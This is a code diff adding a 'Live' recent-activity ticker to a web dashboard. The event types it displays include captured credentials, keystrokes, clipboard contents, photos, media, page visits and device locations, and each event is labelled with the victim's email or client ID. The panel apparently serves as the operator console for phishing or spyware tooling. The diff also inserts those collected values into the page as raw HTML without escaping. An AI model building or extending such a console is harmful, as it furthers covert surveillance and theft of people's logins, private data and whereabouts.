@@ -513,6 +513,9 @@ body[data-dark] .lightbox{background:rgba(0,0,0,.97)}
     <div class="stat"><div id="s-err" class="n">0</div><div class="l">Errors</div></div>
 </div>
 
+<!-- RECENT ACTIVITY TICKER -->
+<div id="recentActivityBar" style="display:none;background:var(--bg2);border-top:1px solid var(--border2);border-bottom:1px solid var(--border2);padding:5px 16px;font-size:.66rem;color:var(--dim);display:flex;align-items:center;gap:10px;overflow-x:auto;white-space:nowrap;"></div>
+
 <!-- FILTER + TABS -->
 <div class="toolbar">
     <div class="filter-wrap">
@@ -1706,12 +1709,14 @@ async function refreshAll() {
                     lastEventTimestamp = evts[0].timestamp;
                 }
                 renderEvents();
+                renderRecentActivity(events.slice(0, 8));
             } catch(e) { showError('refreshAll-events', e); }
         } else if (!lastEventTimestamp && evts && Array.isArray(evts)) {
             // First load, no new events
             events = evts;
             if (evts[0]) lastEventTimestamp = evts[0].timestamp;
             renderEvents();
+            renderRecentActivity(events.slice(0, 8));
         }
         lastEventPollTs = Date.now();
 
@@ -2484,6 +2489,20 @@ function renderLocations(locs) {
             <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">Map ↗</a>
         </div>
     `).join('');
+}
+
+function renderRecentActivity(evs) {
+    const bar = $('#recentActivityBar');
+    if (!bar || !evs || !evs.length) return;
+    const icons = { credential_captured: '🔑', client_connected: '🟢', location: '📍', photo: '📷', keystrokes: '⌨️', clipboard: '📋', page_visit: '🌐', media: '🎥', error: '⚠️' };
+    const chips = evs.map(e => {
+        const icon = icons[e.type] || '📌';
+        const ago = e.timestamp ? fmtAgo(e.timestamp) : '';
+        const main = e.data?.email || e.data?.clientId || e.clientId || '';
+        return `<span style="display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:10px;background:var(--panel2);border:1px solid var(--border2);flex-shrink:0;">${icon} <span style="color:var(--fg)">${e.type}</span>${main ? ` <span style="color:var(--accent)">${main.slice(0,16)}</span>` : ''} <span style="color:var(--dim)">${ago}</span></span>`;
+    }).join('');
+    bar.style.display = 'flex';
+    bar.innerHTML = `<span style="flex-shrink:0;font-weight:600;color:var(--fg);margin-right:4px">⚡ Live:</span>${chips}`;
 }
 
 function renderEvents() {
